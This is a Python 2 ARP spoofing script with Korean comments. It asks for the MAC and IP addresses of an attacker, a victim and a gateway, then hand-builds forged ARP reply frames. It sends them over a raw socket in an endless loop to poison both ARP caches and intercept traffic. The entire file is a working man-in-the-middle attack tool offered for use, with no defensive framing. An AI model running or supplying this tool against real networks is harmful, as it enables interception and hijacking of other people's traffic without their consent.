#-*- coding: utf-8 -*-
import socket, struct, binascii, time

waitTime=5

def makeMacAddress(mac): # 00:01:02:03:04:05 형태에서 \\x00\\x01\\x02\\x03\\x04\\x05 형태로 변경
    tmpMac=''
    for i in range(0, 6):
        tmpMac+='\\x'+mac.split(':')[i]
    tmpMac=tmpMac.replace(':', '')
    return tmpMac

def makeIPAddress(ip): # 1.10.20.30 형태에서 \\x01\\x0a\\x14\\x1e 형태로 변경
    tmpIP=''
    for i in range(0, 4):
        if(int(ip.split('.')[i]) < 10): # IP에 10미만의 숫자(1 ~ 9)가 있을 경우 형태(2자리 - \\x1(x), \\x01(o))를 맞추기 위해 앞에 0을 붙임
            tmpIP+='\\x0'+hex(int(ip.split('.')[i]))
            continue
        tmpIP+='\\x'+hex(int(ip.split('.')[i]))
    tmpIP=tmpIP.replace('.', '').replace('0x', '')
    return tmpIP
    
def arpSpoofer(attackerMacAddress, victimMacAddress, gatewayMacAddress, gatewayIP, victimIP, attackerInterface): # ARP Spoofing 을 수행하는 함수
    # 소켓 생성 및 바인딩
    s=socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800)) # Using PF_PACKET, Raw Socket, EETH_P_IP Protocol(0x0800)
    s.bind((attackerInterface, socket.htons(0x0800))) # Set Interpace, EETH_P_IP Protocol(0x0800)

    # Ethernet Header : Destination Mac Address(6Byte) + Source Mac Address(6Byte) + Type(2Byte) 
    code='\\x08\\x06' # ARP Protocol Code
    ethVictim=victimMacAddress+attackerMacAddress+code  
    ethGateway=gatewayMacAddress+attackerMacAddress+code 
    
    # ARP Header : Hadrware Type(2Byte) + Protocol Type(2Byte) + Hardware Address Length(1Byte) + Protocol Address Length(1Byte) + Opcode(2Byte) +
    #              Source Mac Address(6Byte) + Source IP Address(4Byte) + Destination Mac Address(6Byte) + Destination IP Address(4Byte) + Padding(18Byte) + CRC(4Byte)
    hardwareType='\\x00\\x01'
    protocolType='\\x08\\x00'
    hardwareSize='\\x06'
    protocolSize='\\x04'
    opcode='\\x00\\x02'
    
    # Ethernet Header + ARP Header
    victimARP=ethVictim+hardwareType+protocolType+hardwareSize+protocolSize+opcode+attackerMacAddress+gatewayIP+victimMacAddress+victimIP+"\\x00"*22 # 출발지IP는 게이트웨이IP인데 출발지MAC은 공격자Mac으로 설정, 패딩과 CRC는 NULL(0) 로 설정
    gatewayARP=ethGateway+hardwareType+protocolType+hardwareSize+protocolSize+opcode+attackerMacAddress+victimIP+gatewayMacAddress+gatewayIP+"\\x00"*22 # 출발지IP는 피해자IP인데 출발지MAC은 공격자Mac으로 설정, 패딩과 CRC는 NULL(0) 로 설정

    # victimARP 또는 gatewayARP 을 패킷으로 보내면 바이너리 부분이 아닌 문자열 부분에 값이 들어감.(tcpdump로 확인) 따라서 위 값을 아스키문자로 바꿔서 바이너리를 맞춘 후 패킷으로 보내야함
    tmpVictimARP=victimARP.replace('\\', '')
    tmpGatewayARP=gatewayARP.replace('\\', '')
    asciiVictimARP='' # victimARP 을 바이너리로 보내기 위해 변환된 아스키문자들이 들어갈 패킷
    asciiGatewayARP='' # gatewayARP 을 바이너리로 보내기 위해 변환된 아스키문자들이 들어갈 패킷
    for i in range(1, 65):
        tmp=int(tmpVictimARP.split('x')[i], 16)
        asciiVictimARP+=chr(int(tmp))
    for i in range(1, 65):
        tmp=int(tmpGatewayARP.split('x')[i], 16)
        asciiGatewayARP+=chr(int(tmp))
    
    while(1):
        s.send(asciiVictimARP) # 피해자에게 패킷을 계속 전송해서 피해자의 ARP Cache Table을 변조된 상태로 유지시킴
        print "[+] Victim ARP Table Poisoning Packet\n------------------------------------------------------------\n"+victimARP+"\n------------------------------------------------------------\n"+asciiVictimARP+"\n\n"
        s.send(asciiGatewayARP) # 게이트웨이에게 패킷을 계속 전송해서 게이트웨이의 ARP Cache Table을 변조된 상태로 유지시킴
        print "[+] Gateway ARP Table Poisoning Packet\n------------------------------------------------------------\n"+gatewayARP+"\n------------------------------------------------------------\n"+asciiGatewayARP+"\n\n"
        time.sleep(waitTime)
    
def main():
    tmpAttackerMacAddress=raw_input("Input Attacker MAC Address(12:34:56:ab:cd:ef) : ") # 공격자 맥어드레스
    tmpVictimMacAddress=raw_input("Input victim mac address(12:34:56:ab:cd:ef) : ") # 타겟 맥어드레스
    tmpGatewayMacAddress=raw_input("Input gateway mac address(12:34:56:ab:cd:ef) : ") # 게이트웨이 맥어드레스
    attackerInterface=raw_input("Input Interface(eth0) : ") # 공격자 인터페이스
    tmpGatewayIP=raw_input("Input gateway ip(1.2.3.4) : ") # 게이트웨이 IP
    tmpVictimIP=raw_input("Input victim ip(1.2.3.4) : ") # 타겟 IP
    gatewayIP=makeIPAddress(tmpGatewayIP)
    victimIP=makeIPAddress(tmpVictimIP)
    attackerMacAddress=makeMacAddress(tmpAttackerMacAddress)
    victimMacAddress=makeMacAddress(tmpVictimMacAddress)
    gatewayMacAddress=makeMacAddress(tmpGatewayMacAddress)
    arpSpoofer(attackerMacAddress, victimMacAddress, gatewayMacAddress, gatewayIP, victimIP, attackerInterface)
    
if __name__=="__main__":
    main()
